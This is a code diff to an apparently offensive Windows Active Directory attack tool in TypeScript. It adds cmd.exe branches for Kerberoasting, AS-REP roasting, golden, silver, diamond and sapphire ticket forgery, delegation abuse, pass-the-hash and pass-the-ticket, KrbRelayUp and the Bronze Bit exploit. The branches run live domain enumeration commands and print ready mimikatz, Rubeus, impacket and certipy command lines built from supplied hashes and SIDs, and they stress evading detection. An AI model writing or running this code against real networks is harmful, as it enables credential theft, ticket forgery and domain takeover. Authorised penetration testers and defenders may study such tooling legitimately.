@@ -1,4 +1,4 @@
-import { ps, argVal, hasFlag } from "./shared"
+import { ps, cmd, wmic, activeExec, argVal, hasFlag } from "./shared"
 import type { Finding, HookResult } from "./shared"
 
 export async function kerberoast(args: string[], timeout: number): Promise<HookResult> {
@@ -7,6 +7,29 @@ export async function kerberoast(args: string[], timeout: number): Promise<HookR
   const format = argVal(args, "--format") || "hashcat"
   const findings: Finding[] = []
   const output: string[] = ["[*] Kerberoasting — requesting TGS tickets for SPN accounts...\n"]
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== Kerberoast (cmd.exe) ===\n")
+    output.push("[!] TGS ticket extraction requires .NET System.IdentityModel — cmd mode provides SPN enumeration\n")
+    const spnFilter = spn ? `-Q "${spn}"` : "-Q */*"
+    const setspnResult = await cmd(`setspn ${spnFilter}`, timeout)
+    if (setspnResult.exitCode === 0 && setspnResult.stdout.trim()) {
+      const spnLines = setspnResult.stdout.trim().split("\n").filter(l => l.trim() && !l.includes("Checking domain") && !l.includes("CN="))
+      output.push(`[+] SPNs found: ${spnLines.length}`)
+      for (const l of spnLines.slice(0, 30)) output.push(`    ${l.trim()}`)
+    } else {
+      output.push("[-] setspn not available or no SPNs found")
+    }
+    const klist = await cmd("klist", timeout)
+    output.push(`\n[*] Current tickets:\n${klist.stdout.trim().split("\n").slice(0, 15).join("\n")}`)
+    output.push("\n[*] Kerberoast with external tools:")
+    output.push("    Rubeus.exe kerberoast /nowrap")
+    output.push("    GetUserSPNs.py domain/user:pass -dc-ip DC -request")
+    output.push("    Rubeus.exe kerberoast /rc4opsec /nowrap  (RC4 only, opsec)")
+    output.push(`    Hashcat: hashcat -m 13100 hashes.txt wordlist.txt  (${format})`)
+    if (setspnResult.stdout.includes("SPN")) findings.push({ checkId: "WIN-KERB-001", provider: "windows", severity: "high", status: "ENUMERATED", resource: "kerberos://spn-targets", title: "Kerberoast SPN targets enumerated via setspn", details: "SPN accounts found — use Rubeus/impacket for ticket extraction", remediation: "Use AES for service accounts, set long random passwords, use gMSA" })
+    return { output: output.join("\n"), findings }
+  }
 
   const script = `
 $ErrorActionPreference = 'SilentlyContinue'
@@ -119,6 +142,26 @@ export async function asreproast(args: string[], timeout: number): Promise<HookR
   const format = argVal(args, "--format") || "hashcat"
   const findings: Finding[] = []
   const output: string[] = ["[*] AS-REP Roasting — finding accounts without Kerberos pre-auth...\n"]
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== AS-REP Roasting (cmd.exe) ===\n")
+    output.push("[!] AS-REP hash extraction requires raw Kerberos sockets (.NET) — cmd provides user enumeration\n")
+    const userFilter = user ? `"(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=${user}))"` : `"(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"`
+    const dsquery = await cmd(`dsquery * -filter ${userFilter} -attr samAccountName userAccountControl -limit 100 2>nul`, timeout)
+    if (dsquery.exitCode === 0 && dsquery.stdout.trim()) {
+      output.push("[+] Accounts with DONT_REQUIRE_PREAUTH:")
+      output.push(dsquery.stdout.trim())
+    } else {
+      output.push("[-] dsquery not available or no AS-REP roastable accounts found")
+      const net = await cmd("net user /domain 2>nul", timeout)
+      if (net.exitCode === 0) output.push(`[*] Domain users available — use Rubeus/impacket to check pre-auth:\n${net.stdout.trim().split("\n").slice(0, 10).join("\n")}`)
+    }
+    output.push("\n[*] AS-REP Roast with external tools:")
+    output.push("    Rubeus.exe asreproast /nowrap")
+    output.push("    GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC")
+    output.push(`    Hashcat: hashcat -m 18200 hashes.txt wordlist.txt  (${format})`)
+    return { output: output.join("\n"), findings }
+  }
 
   const script = `
 $ErrorActionPreference = 'SilentlyContinue'
@@ -271,6 +314,29 @@ export async function goldenTicket(args: string[], timeout: number): Promise<Hoo
         "[!] Required: --krbtgt-hash HASH --domain DOMAIN --sid SID\n\nGet krbtgt hash via: winhook dcsync --user krbtgt",
       findings,
     }
+  }
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== Golden Ticket (cmd.exe) ===\n")
+    output.push("[!] Golden Ticket forging requires Kerberos PAC construction (.NET P/Invoke)")
+    output.push("[*] cmd.exe provides prerequisite validation + tool guidance\n")
+    const klist = await cmd("klist", timeout)
+    output.push(`[*] Current tickets:\n${klist.stdout.trim().split("\n").slice(0, 10).join("\n")}`)
+    const nltest = await cmd("nltest /dsgetdc:", timeout)
+    const dcName = nltest.stdout.match(/DC: \\\\(.+)/)?.[1]?.trim()
+    output.push(dcName ? `\n[+] DC: ${dcName}` : "\n[!] Cannot reach DC")
+    output.push(`\n[*] Parameters:`)
+    output.push(`    Domain: ${domain}`)
+    output.push(`    SID: ${sid}`)
+    output.push(`    User: ${user}`)
+    output.push(`    Groups: ${groups}`)
+    output.push(`    krbtgt hash: ${krbtgtHash.substring(0, 8)}...`)
+    output.push("\n[*] Forge with external tools:")
+    output.push(`    mimikatz # kerberos::golden /user:${user} /domain:${domain} /sid:${sid} /krbtgt:${krbtgtHash} /groups:${groups} /ptt`)
+    output.push(`    ticketer.py -nthash ${krbtgtHash} -domain-sid ${sid} -domain ${domain} ${user}`)
+    output.push(`    Rubeus.exe golden /rc4:${krbtgtHash} /user:${user} /domain:${domain} /sid:${sid} /ptt`)
+    output.push("\n[*] After injection, verify: klist")
+    return { output: output.join("\n"), findings }
   }
 
   const script = `
@@ -437,6 +503,25 @@ export async function silverTicket(args: string[], timeout: number): Promise<Hoo
     return { output: "[!] Required: --service-hash HASH --spn SPN --domain DOMAIN --sid SID", findings }
   }
 
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== Silver Ticket (cmd.exe) ===\n")
+    output.push("[!] Silver Ticket forging requires Kerberos TGS construction (.NET P/Invoke)")
+    output.push("[*] cmd.exe provides prerequisite validation + tool guidance\n")
+    output.push(`[*] Parameters:`)
+    output.push(`    SPN: ${spn}`)
+    output.push(`    Domain: ${domain}`)
+    output.push(`    SID: ${sid}`)
+    output.push(`    User: ${user}`)
+    output.push(`    Service hash: ${serviceHash.substring(0, 8)}...`)
+    output.push("\n[*] Forge with external tools:")
+    output.push(`    mimikatz # kerberos::golden /user:${user} /domain:${domain} /sid:${sid} /rc4:${serviceHash} /service:${spn.split("/")[0]} /target:${spn.split("/")[1] || "TARGET"} /ptt`)
+    output.push(`    ticketer.py -nthash ${serviceHash} -domain-sid ${sid} -domain ${domain} -spn ${spn} ${user}`)
+    output.push(`    Rubeus.exe silver /rc4:${serviceHash} /user:${user} /domain:${domain} /sid:${sid} /service:${spn} /ptt`)
+    output.push("\n[*] Verify: klist")
+    output.push("[*] Silver Ticket is stealthier than Golden — no DC contact needed")
+    return { output: output.join("\n"), findings }
+  }
+
   const script = `
 $domainName = "${domain}".ToUpper()
 $domainSid = "${sid}"
@@ -517,6 +602,32 @@ export async function delegationAbuse(args: string[], timeout: number): Promise<
 
   if (!type) {
     return { output: "[!] Required: --type <unconstrained|constrained|rbcd>", findings }
+  }
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push(`=== Kerberos Delegation Enumeration (cmd.exe) — ${type} ===\n`)
+    if (type === "unconstrained") {
+      const dsquery = await cmd('dsquery * -filter "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -attr cn samAccountName -limit 100 2>nul', timeout)
+      if (dsquery.exitCode === 0 && dsquery.stdout.trim()) {
+        output.push("[+] Unconstrained delegation accounts:")
+        output.push(dsquery.stdout.trim())
+        findings.push({ checkId: "WIN-DELEG-001", provider: "windows", severity: "critical", status: "ENUMERATED", resource: "kerberos://delegation", title: "Unconstrained delegation accounts found", details: "TrustedForDelegation flag set — can impersonate any user", remediation: "Switch to constrained delegation or RBCD" })
+      } else {
+        output.push("[-] dsquery unavailable or no unconstrained delegation found")
+      }
+    }
+    if (type === "constrained") {
+      const dsquery = await cmd('dsquery * -filter "(msDS-AllowedToDelegateTo=*)" -attr cn samAccountName msDS-AllowedToDelegateTo -limit 100 2>nul', timeout)
+      output.push(dsquery.exitCode === 0 && dsquery.stdout.trim() ? `[+] Constrained delegation:\n${dsquery.stdout.trim()}` : "[-] No constrained delegation found")
+    }
+    if (type === "rbcd") {
+      const dsquery = await cmd('dsquery * -filter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" -attr cn samAccountName -limit 100 2>nul', timeout)
+      output.push(dsquery.exitCode === 0 && dsquery.stdout.trim() ? `[+] RBCD configured:\n${dsquery.stdout.trim()}` : "[-] No RBCD configured")
+    }
+    output.push("\n[*] Exploit with external tools:")
+    output.push("    Rubeus.exe s4u /user:SVC /rc4:HASH /impersonateuser:Administrator /msdsspn:SPN /ptt")
+    output.push("    getST.py domain/user:pass -spn SPN -impersonate Administrator")
+    return { output: output.join("\n"), findings }
   }
 
   const script = `
@@ -689,6 +800,24 @@ export async function overpassHash(args: string[], timeout: number): Promise<Hoo
     return { output: "[!] Required: --user USER --hash HASH --domain DOMAIN", findings }
   }
 
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== Overpass-the-Hash (cmd.exe) ===\n")
+    output.push("[!] Overpass-the-Hash requires LsaLogonUser P/Invoke — PS only")
+    output.push("[*] cmd.exe provides current ticket context + tool guidance\n")
+    const klist = await cmd("klist", timeout)
+    output.push(`[*] Current Kerberos tickets:\n${klist.stdout.trim()}`)
+    output.push(`\n[*] Parameters:`)
+    output.push(`    User: ${user}`)
+    output.push(`    Domain: ${domain}`)
+    output.push(`    Hash: ${hash.substring(0, 8)}...`)
+    output.push("\n[*] Overpass-the-Hash with external tools:")
+    output.push(`    mimikatz # sekurlsa::pth /user:${user} /domain:${domain} /ntlm:${hash} /run:cmd.exe`)
+    output.push(`    Rubeus.exe asktgt /user:${user} /domain:${domain} /rc4:${hash} /ptt`)
+    output.push(`    getTGT.py ${domain}/${user} -hashes :${hash}`)
+    output.push("\n[*] Verify: klist (should show new TGT for target user)")
+    return { output: output.join("\n"), findings }
+  }
+
   const script = `
 $ErrorActionPreference = 'Stop'
 
@@ -844,6 +973,33 @@ export async function passTheTicket(args: string[], timeout: number): Promise<Ho
 
   if (!action) {
     return { output: "[!] Required: --action <list|export|import>", findings }
+  }
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== Pass-the-Ticket (cmd.exe) ===\n")
+    if (action === "list") {
+      const klist = await cmd("klist", timeout)
+      output.push("=== Current Kerberos Tickets ===")
+      output.push(klist.stdout)
+      const klistSessions = await cmd("klist sessions", timeout)
+      if (klistSessions.exitCode === 0) output.push(`\n=== Active Sessions ===\n${klistSessions.stdout}`)
+      const ticketCount = (klist.stdout.match(/#\d+>/g) || []).length
+      if (ticketCount > 0) findings.push({ checkId: "WIN-KERB-PTT-001", provider: "windows", severity: "medium", status: "ENUMERATED", resource: "kerberos://tickets", title: `${ticketCount} Kerberos ticket(s) in cache`, details: "Cached tickets listed via klist", remediation: "Purge with: klist purge" })
+    }
+    if (action === "export") {
+      output.push("[!] Ticket export requires LSA P/Invoke — use external tools:")
+      output.push("    mimikatz # kerberos::list /export")
+      output.push("    Rubeus.exe dump /nowrap")
+      output.push("    Rubeus.exe triage (list all logon session tickets)")
+    }
+    if (action === "import" && ticketPath) {
+      output.push("[!] Ticket import (Pass-the-Ticket) requires LSA P/Invoke:")
+      output.push(`    mimikatz # kerberos::ptt ${ticketPath}`)
+      output.push(`    Rubeus.exe ptt /ticket:${ticketPath}`)
+    }
+    const purge = await cmd("klist purge 2>nul && echo PURGE_AVAILABLE", timeout)
+    output.push(purge.stdout.includes("PURGE_AVAILABLE") ? "\n[*] Ticket purge: klist purge (cmd native)" : "\n[-] klist purge not available")
+    return { output: output.join("\n"), findings }
   }
 
   const script = `
@@ -1065,6 +1221,32 @@ export async function diamondTicket(args: string[], timeout: number): Promise<Ho
   const findings: Finding[] = []
   const output: string[] = ["[*] Diamond Ticket — Modified PAC on Legitimate TGT\n"]
 
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== Diamond Ticket (cmd.exe) ===\n")
+    output.push("[!] Diamond Ticket PAC modification requires .NET Kerberos APIs — PS only\n")
+    if (action === "check") {
+      const nltest = await cmd("nltest /dsgetdc:", timeout)
+      const dcName = nltest.stdout.match(/DC: \\\\(.+)/)?.[1]?.trim()
+      output.push(dcName ? `[+] DC: ${dcName}` : "[-] Cannot reach DC")
+      const klist = await cmd("klist", timeout)
+      output.push(klist.stdout.includes("krbtgt") ? "[+] Current TGT in cache" : "[-] No TGT — need to authenticate first")
+      output.push("\n[*] Diamond Ticket concept:")
+      output.push("    1. Request legitimate TGT from DC")
+      output.push("    2. Decrypt TGT using krbtgt AES key")
+      output.push("    3. Modify PAC (add privileged groups)")
+      output.push("    4. Re-encrypt with krbtgt key")
+      output.push("    5. Result: modified real ticket — harder to detect than Golden")
+    }
+    output.push("\n[*] Parameters:")
+    output.push(`    User: ${user || "not set"}  Domain: ${domain || "not set"}`)
+    output.push(`    krbtgt AES: ${krbtgtAes ? krbtgtAes.substring(0, 8) + "..." : "not set"}`)
+    output.push(`    Groups: ${groups}`)
+    output.push("\n[*] Forge with external tools:")
+    output.push(`    Rubeus.exe diamond /krbkey:${krbtgtAes || "AES256"} /user:${user || "USER"} /domain:${domain || "DOMAIN"} /groups:${groups} /ptt`)
+    output.push(`    ticketer.py -aesKey ${krbtgtAes || "AES256"} -domain ${domain || "DOMAIN"} -groups ${groups} ${user || "USER"}`)
+    return { output: output.join("\n"), findings }
+  }
+
   if (action === "check") {
     const script = `
 # Diamond Ticket prerequisites check
@@ -1284,6 +1466,24 @@ export async function sapphireTicket(args: string[], timeout: number): Promise<H
     return { output: output.join("\n"), findings }
   }
 
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== Sapphire Ticket (cmd.exe) ===\n")
+    output.push("[!] Sapphire Ticket requires S4U2Self + U2U + PAC grafting (.NET Kerberos)")
+    output.push("[*] This is the most advanced ticket forgery — zero forgery artifacts\n")
+    output.push(`[*] Parameters:`)
+    output.push(`    Target user: ${user}`)
+    output.push(`    Domain: ${domain}`)
+    output.push(`    Impersonate: ${impersonate}`)
+    output.push(`    krbtgt AES: ${krbtgtAes.substring(0, 8)}...`)
+    const klist = await cmd("klist", timeout)
+    output.push(`\n[*] Current tickets:\n${klist.stdout.trim().split("\n").slice(0, 8).join("\n")}`)
+    output.push("\n[*] Forge with external tools:")
+    output.push(`    Rubeus.exe diamond /krbkey:${krbtgtAes} /user:${user} /domain:${domain} /ticketuser:${impersonate} /dc:DC /ptt`)
+    output.push(`    ticketer.py -aesKey ${krbtgtAes} -domain ${domain} -impersonate ${impersonate} ${user}`)
+    output.push("\n[*] Detection: Nearly undetectable — uses genuine KDC-issued PAC")
+    return { output: output.join("\n"), findings }
+  }
+
   const script = `
 Write-Output "[*] Impersonation target: ${impersonate}"
 Write-Output "[*] Ticket owner: ${user}"
@@ -1431,6 +1631,36 @@ export async function krbrelayup(args: string[], timeout: number): Promise<HookR
   const ca = argVal(args, "--ca")
   const findings: Finding[] = []
   const output: string[] = [`[*] KrbRelayUp — Local Privesc via Kerberos Relay (${method})\n`]
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push(`=== KrbRelayUp (cmd.exe) — ${method} ===\n`)
+    if (action === "check") {
+      output.push("[*] Checking KrbRelayUp prerequisites via reg query...\n")
+      const ldapSigning = await cmd('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" /v LDAPServerIntegrity 2>nul', timeout)
+      const sigVal = ldapSigning.stdout.match(/LDAPServerIntegrity\s+REG_DWORD\s+0x(\w+)/)?.[1]
+      const sigInt = sigVal ? parseInt(sigVal, 16) : -1
+      output.push(sigInt === 2 ? "[-] LDAP signing: REQUIRED — NOT VULNERABLE" : sigInt === 1 ? "[+] LDAP signing: NEGOTIATED — VULNERABLE (downgrade)" : sigInt === 0 ? "[+] LDAP signing: NONE — VULNERABLE" : "[+] LDAP signing: NOT CONFIGURED (default=not required) — VULNERABLE")
+      const chBind = await cmd('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" /v LdapEnforceChannelBinding 2>nul', timeout)
+      const cbVal = chBind.stdout.match(/LdapEnforceChannelBinding\s+REG_DWORD\s+0x(\w+)/)?.[1]
+      const cbInt = cbVal ? parseInt(cbVal, 16) : -1
+      output.push(cbInt === 2 ? "[-] Channel binding: REQUIRED — NOT VULNERABLE" : cbInt === 1 ? "[*] Channel binding: WHEN SUPPORTED" : "[+] Channel binding: NOT CONFIGURED — VULNERABLE")
+      const maq = await cmd('dsquery * -filter "(objectClass=domain)" -attr ms-DS-MachineAccountQuota -limit 1 2>nul', timeout)
+      const maqMatch = maq.stdout.match(/(\d+)/)
+      output.push(maqMatch ? `[*] MachineAccountQuota: ${maqMatch[1]}${parseInt(maqMatch[1]) > 0 ? " — can add computer accounts" : ""}` : "[*] MachineAccountQuota: check via PS")
+      const dns = await cmd("nltest /dsgetdc:", timeout)
+      output.push(`\n[*] DC info:\n${dns.stdout.trim().split("\n").slice(0, 5).join("\n")}`)
+    }
+    if (action === "relay") {
+      output.push("[!] Kerberos relay requires OXID/DCOM + LDAP relay — use external tools:")
+      output.push(`    KrbRelayUp.exe relay -m ${method} -p ${port}`)
+      output.push(`    KrbRelayUp.exe relay -m ${method} -cls {d99e6e74-fc88-11d0-b498-00a0c90312f3}`)
+      if (method === "adcs" && ca) output.push(`    KrbRelayUp.exe relay -m adcs -ca ${ca}`)
+    }
+    output.push("\n[*] KrbRelayUp external tools:")
+    output.push(`    KrbRelayUp.exe relay -m ${method} -p ${port}`)
+    output.push("    KrbRelayUp.exe spawn -m rbcd -d domain -cn FAKEPC$ -cp Password123")
+    return { output: output.join("\n"), findings }
+  }
 
   if (action === "check") {
     const script = `
@@ -1690,6 +1920,26 @@ export async function unpacHash(args: string[], timeout: number): Promise<HookRe
     return { output: output.join("\n"), findings }
   }
 
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== UnPAC-the-hash (cmd.exe) ===\n")
+    output.push("[!] PKINIT AS-REQ requires .NET Kerberos + ASN.1 — PS only\n")
+    output.push(`[*] Parameters:`)
+    output.push(`    Certificate: ${cert}`)
+    output.push(`    User: ${user}`)
+    output.push(`    Domain: ${domain}`)
+    output.push(`    DC: ${dc || "auto-detect"}`)
+    const certCheck = await cmd(`dir "${cert}" 2>nul`, timeout)
+    output.push(certCheck.exitCode === 0 ? `[+] Certificate file exists` : `[!] Certificate file not found: ${cert}`)
+    const certInfo = await cmd(`certutil -dump "${cert}" 2>nul`, timeout)
+    if (certInfo.exitCode === 0) output.push(`[+] Certificate info:\n${certInfo.stdout.trim().split("\n").slice(0, 10).join("\n")}`)
+    output.push("\n[*] UnPAC-the-hash with external tools:")
+    output.push(`    certipy auth -pfx ${cert} -username ${user} -domain ${domain}${dc ? ` -dc-ip ${dc}` : ""}`)
+    output.push(`    Rubeus.exe asktgt /user:${user} /certificate:${cert}${certPass ? ` /password:${certPass}` : ""} /domain:${domain} /getcredentials /ptt`)
+    output.push(`    gettgtpkinit.py ${domain}/${user} -cert-pfx ${cert}${certPass ? ` -pfx-pass ${certPass}` : ""}`)
+    output.push("\n[*] Chain: cert → UnPAC → NT hash → DCSync / Pass-the-Hash")
+    return { output: output.join("\n"), findings }
+  }
+
   const dcArg = dc || ""
   const script = `
 Write-Output "[*] Certificate: ${cert}"
@@ -1834,6 +2084,34 @@ export async function bronzeBit(args: string[], timeout: number): Promise<HookRe
   const impersonateUser = argVal(args, "--impersonate") || "Administrator"
   const findings: Finding[] = []
   const output: string[] = ["[*] Bronze Bit — Kerberos Constrained Delegation Bypass (CVE-2020-17049)\n"]
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== Bronze Bit — CVE-2020-17049 (cmd.exe) ===\n")
+    if (action === "check") {
+      output.push("[*] Enumerating constrained delegation accounts...")
+      const dsquery = await cmd('dsquery * -filter "(msDS-AllowedToDelegateTo=*)" -attr samAccountName msDS-AllowedToDelegateTo userAccountControl -limit 100 2>nul', timeout)
+      if (dsquery.exitCode === 0 && dsquery.stdout.trim()) {
+        output.push(dsquery.stdout.trim())
+        const lines = dsquery.stdout.trim().split("\n").filter(l => l.trim() && !l.startsWith("  ")).length
+        output.push(`\n[+] ${lines} account(s) with constrained delegation`)
+        findings.push({ checkId: "WIN-BRONZE-001", provider: "windows", severity: "high", status: "ENUMERATED", resource: "kerberos://constrained-delegation", title: `${lines} constrained delegation account(s) — Bronze Bit candidates`, details: "Accounts with msDS-AllowedToDelegateTo may be exploitable via CVE-2020-17049", remediation: "Install KB4598347. Switch to RBCD where possible." })
+      } else {
+        output.push("[-] dsquery unavailable or no constrained delegation found")
+      }
+      output.push("\n[*] Patch check:")
+      const hotfix = await cmd("wmic qfe get HotFixID | findstr KB4598347 2>nul", timeout)
+      output.push(hotfix.stdout.includes("KB4598347") ? "[-] KB4598347 installed — CVE-2020-17049 patched" : "[+] KB4598347 NOT found — potentially vulnerable")
+    }
+    if (action === "exploit") {
+      output.push("[!] Bronze Bit S4U2Self forwardable bit flip requires .NET Kerberos\n")
+      output.push("[*] Exploit with external tools:")
+      output.push(`    Rubeus.exe s4u /user:SVC /rc4:HASH /impersonateuser:${impersonateUser} /msdsspn:${targetSpn || "SPN"} /altservice:${serviceSpn || "SERVICE"} /bronzebit /ptt`)
+      output.push(`    getST.py domain/svc:pass -spn ${targetSpn || "SPN"} -impersonate ${impersonateUser} -force-forwardable`)
+    }
+    output.push("\n[*] Bronze Bit bypasses 'Account is sensitive and cannot be delegated' flag")
+    output.push("    by flipping the forwardable bit in the service ticket")
+    return { output: output.join("\n"), findings }
+  }
 
   if (action === "check") {
     const script = `
